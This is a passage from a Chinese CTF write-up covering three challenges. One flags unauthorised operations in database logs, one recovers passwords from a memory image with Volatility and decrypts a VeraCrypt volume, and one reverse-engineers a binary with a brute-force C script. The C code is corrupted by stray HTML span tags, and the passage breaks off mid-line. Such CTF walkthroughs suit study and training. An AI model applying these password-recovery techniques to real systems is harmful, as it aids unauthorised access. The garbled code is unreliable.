读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;users.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;users.json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><span class="hljs-comment"># 读取CSV文件</span><br>df = pd.read_csv(<span class="hljs-string">&#x27;actionlog.csv&#x27;</span>)<br><span class="hljs-comment"># 将数据转换为JSON格式</span><br>json_data = df.to_json(<span class="hljs-string">&#x27;actionlog.json&#x27;</span>, orient=<span class="hljs-string">&#x27;records&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020512.png" alt="image-20240131142445029">​</p><p>‍</p><p>‍</p><p>‍根据指引的意思进行数据处理</p><p>tables.json 数据库的允许的操作时间，判断是否存在违规操作时间的行为</p><p>actionlog.json操作者的行为记录</p><p>permissions.json 操作权限信息表</p><p>users.json  操作人是否存在，记录操作者信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessor</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action_log_path, user_path, table_path, permission_path</span>):<br>        self.action_logs = pd.read_json(action_log_path)<br>        self.users = pd.read_json(user_path)<br>        self.tables = pd.read_json(table_path)<br>        self.permissions = pd.read_json(permission_path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_info</span>(<span class="hljs-params">self, username</span>):<br>        user_row = self.users[self.users[<span class="hljs-string">&#x27;账号&#x27;</span>] == username]<br>        <span class="hljs-keyword">if</span> user_row.empty:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> user_row.iloc[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_info</span>(<span class="hljs-params">self, table_name</span>):<br>        table_row = self.tables[self.tables[<span class="hljs-string">&#x27;表名&#x27;</span>] == table_name]<br>        <span class="hljs-keyword">if</span> table_row.empty:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> table_row.iloc[<span class="hljs-number">0</span>]<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_permission_info</span>(<span class="hljs-params">self, group_id</span>):<br>        permission_row = self.permissions[self.permissions[<span class="hljs-string">&#x27;编号&#x27;</span>] == group_id]<br>        <span class="hljs-keyword">if</span> permission_row.empty:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> permission_row.iloc[<span class="hljs-number">0</span>]<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">time_in_range</span>(<span class="hljs-params">self, time_str, start, end</span>):<br>        current = datetime.strptime(time_str, <span class="hljs-string">&#x27;%H:%M:%S&#x27;</span>)<br>        start_time = datetime.strptime(start, <span class="hljs-string">&#x27;%H:%M:%S&#x27;</span>)<br>        end_time = datetime.strptime(end, <span class="hljs-string">&#x27;%H:%M:%S&#x27;</span>)<br>        <span class="hljs-keyword">return</span> start_time &lt;= current &lt;= end_time<br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_logs</span>(<span class="hljs-params">self</span>):<br>        flags = []<br>        <span class="hljs-keyword">for</span> _, action_log <span class="hljs-keyword">in</span> self.action_logs.iterrows():<br>            user_info = self.get_user_info(action_log[<span class="hljs-string">&#x27;账号&#x27;</span>])<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_info:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span> 用户不存在 0_0_0_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                flags.append(<span class="hljs-string">f&quot;0_0_0_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br>        <br>            action = re.search(<span class="hljs-string">r&#x27;\b(insert|update|delete|select)\s(\S+)&#x27;</span>, action_log[<span class="hljs-string">&#x27;执行操作&#x27;</span>], re.IGNORECASE)<br>            <span class="hljs-keyword">if</span> action:<br>                table_info = self.get_table_info(action.group(<span class="hljs-number">2</span>))<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> table_info:<br>                    <span class="hljs-keyword">continue</span><br><br>                permission_info = self.get_permission_info(user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>])<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> permission_info:<br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> permission_info[<span class="hljs-string">&#x27;可操作表编号&#x27;</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>                    flags.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-keyword">if</span> action_log[<span class="hljs-string">&#x27;执行操作&#x27;</span>].split()[<span class="hljs-number">0</span>].lower() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> permission_info[<span class="hljs-string">&#x27;可操作权限&#x27;</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>                    flags.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>                time_ranges = table_info[<span class="hljs-string">&#x27;可操作时间段(时:分:秒)&#x27;</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(self.time_in_range(action_log[<span class="hljs-string">&#x27;操作时间&#x27;</span>][-<span class="hljs-number">8</span>:], *r.split(<span class="hljs-string">&quot;~&quot;</span>)) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> time_ranges):<br>                    flags.append(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;user_info[<span class="hljs-string">&#x27;所属权限组编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;table_info[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>_<span class="hljs-subst">&#123;action_log[<span class="hljs-string">&#x27;编号&#x27;</span>]&#125;</span>&quot;</span>)<br><br>        flags.sort(key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x.split(<span class="hljs-string">&#x27;_&#x27;</span>)[<span class="hljs-number">0</span>]))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;,&quot;</span>.join(flags)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    processor = DataProcessor(<span class="hljs-string">&quot;actionlog.json&quot;</span>, <span class="hljs-string">&quot;users.json&quot;</span>, <span class="hljs-string">&quot;tables.json&quot;</span>, <span class="hljs-string">&quot;permissions.json&quot;</span>)<br>    result = processor.analyze_logs()<br>    <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020670.png" alt="image-20240131160845686">​</p><p>‍</p><p>md5生成flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">import hashlib<br><br><span class="hljs-comment"># 定义要转换的字符串</span><br>text = <span class="hljs-string">&quot;0_0_0_6810,0_0_0_8377,6_14_91_6786,7_64_69_3448,9_18_61_5681,30_87_36_235,31_76_85_9617,49_37_30_8295,75_15_43_8461,79_3_15_9011&quot;</span><br><br><span class="hljs-comment"># 使用hashlib库生成MD5哈希值</span><br>md5_hash = hashlib.md5(text.encode()).hexdigest()<br><br><span class="hljs-built_in">print</span>(md5_hash)<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020827.png" alt="image-20240131162423336">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;271b1ffebf7a76080c7a6e134ae4c929&#125;<br></code></pre></td></tr></table></figure><h3 id="easy-rawraw"><a href="#easy-rawraw" class="headerlink" title="easy_rawraw"></a>easy_rawraw</h3><p>‍</p><p>‍</p><p>‍‍passware kit 可以得到用户的密码，密码1</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ADMIN<span class="hljs-string">\Administrator</span>  das123admin321<br></code></pre></td></tr></table></figure><p>既然和密码有关，vol搜密码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020973.png" alt="image-20240131155404262">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020142.png" alt="image-20240131155707574">​</p><p>‍</p><p>‍</p><p>‍导出压缩包后解压，分离png，根据备注猜测密码20240210，拿到pass.txt，密码2</p><p>卡了很久无果，让学弟用010搜下password</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020307.png" alt="image-20240131160111228">​</p><p>找到了密码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">DasrIa<span class="hljs-number">456</span>sAdmI<span class="hljs-symbol">n987</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍使用这个密码解密rar</p><p>加上pslist看到了VeraCrypt，搭配密码2挂载解密，得到xlsx</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020462.png" alt="image-20240131160358647">​</p><p>最后使用密码1得到flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020605.png" alt="image-20240131160309740">​</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>‍</p><h3 id="MZ"><a href="#MZ" class="headerlink" title="MZ"></a>MZ</h3><p>‍</p><p>IDA反编译打开</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020758.png" alt="image-20240131165525325">​</p><p>内容比较简单，首先要求输入48位长度的字符串，然后通过字符串的ASCII值查表判断，<br>过了判断后，下边还有个MD4用于验证字符串的正确性。<br>通过调试把表格扒下来，然后编写脚本，看得出来需要使用回溯算法来确定，但是我搓了半个小时没搞出来，然后只能自己手动。<br>脚本如下：</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020912.png" alt="image-20240131165537086">​</p><p>中间手动探索过程省略。。。。</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020431.jpg" alt="img">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020575.jpg" alt="img">​</p><p>这道题还有一个关键信息是flag是一个有意义的字符串，也就是说看起来像个句子，通过这个在手动判断的时候先找看着像的，不行再手动回溯。<br>值得一提的时候最后两个字符会有区别，需要通过MD4来判断<br>flag：Somet1mes_ch0ice_i5_more_import@nt_tHan_effort~!</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402021020728.png" alt="image-20240131165613367">​</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">char</span> flag[<span class="hljs-number">100</span>] = &#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-type">begin_t</span>[<span class="hljs-number">100</span>] = &#123;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-type">ebp_t</span> = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">cum</span><span class="hljs-params">(<span class="hljs-type">int</span> begin,<span class="hljs-type">int</span> end,<span class="hljs-type">int</span> round)</span>&#123;<br>  <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> i = <span class="hljs-number">32</span>;i &lt; <span class="hljs-number">127</span>;i++)&#123;<br>    j = i * <span class="hljs-number">2</span> + begin;<br>    <span class="hljs-keyword">if</span>(ida_chars[j] - <span class="hljs-number">5</span> &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; i || ida_chars[j] + <span class="hljs-number">5</span> &lt;/span&gt; i)&#123;<br>      flag[round] = i;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">1</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;V&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">2</span>] &lt;/span&gt; <span class="hljs-string">&#x27;_&#x27;</span> || flag[<span class="hljs-number">2</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">4</span>] &lt;/span&gt; <span class="hljs-string">&#x27;9&#x27;</span> || flag[<span class="hljs-number">4</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;n&#x27;</span> || flag[<span class="hljs-number">4</span>] &lt;/span&gt; <span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[5] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;1&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">6</span>] &lt;/span&gt; <span class="hljs-string">&#x27;C&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">7</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">7</span>] &lt;/span&gt; <span class="hljs-string">&#x27;6&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">8</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;A&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">8</span>] &lt;/span&gt; <span class="hljs-string">&#x27;^&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[8] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;s&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[9] &lt;/span&gt; &#x27;c&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[9] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;q&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[10] &lt;/span&gt; &#x27;g&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[9] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;d&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[10] &lt;/span&gt; &#x27;2&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[10] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;C&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[11] &lt;/span&gt; &#x27;-&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[11] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;O&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">9</span>] &lt;/span&gt; <span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">10</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;M&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[10] &lt;/span&gt; &#x27;c&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">11</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;)&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">12</span>] &lt;/span&gt; <span class="hljs-string">&#x27;,&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">13</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;T&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">13</span>] &lt;/span&gt; <span class="hljs-string">&#x27;f&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[13] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;i&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">14</span>] &lt;/span&gt; <span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">16</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;%&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">16</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">17</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;5&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">17</span>] &lt;/span&gt; <span class="hljs-string">&#x27;P&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">17</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;T&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[17] &lt;/span&gt; &#x27;i&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">20</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;*&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">20</span>] &lt;/span&gt; <span class="hljs-string">&#x27;5&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">20</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;7&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[20] &lt;/span&gt; &#x27;m&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">21</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">21</span>] &lt;/span&gt; <span class="hljs-string">&#x27;Z&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">21</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;h&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[21] &lt;/span&gt; &#x27;o&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">24</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;C&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">25</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&lt;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[25] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;i&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">27</span>] &lt;/span&gt; <span class="hljs-string">&#x27;&amp;&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">27</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;U&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[27] &lt;/span&gt; &#x27;p&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">28</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;+&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">29</span>] &lt;/span&gt; <span class="hljs-string">&#x27;.&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">29</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">29</span>] &lt;/span&gt; <span class="hljs-string">&#x27;k&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">30</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span class="hljs-string">&#x27;G&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">30</span>] &lt;/span&gt; <span class="hljs-string">&#x27;O&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">31</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<span class="hljs-keyword">continue</span>;<br>      <span class="hljs-comment">// if(flag[31] &lt;span style=&quot;font-weight: bold;&quot; class=&quot;mark&quot;&gt; &#x27;@&#x27;)continue;</span><br>      <span class="hljs-comment">// if(flag[31] &lt;/span&gt; &#x27;J&#x27;)continue;</span><br>      <span class="hljs-keyword">if</span>(flag[<span class="hljs-number">32</span>] &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> class=<span class="hljs-string">&quot;mark&quot;</span>&gt; <span 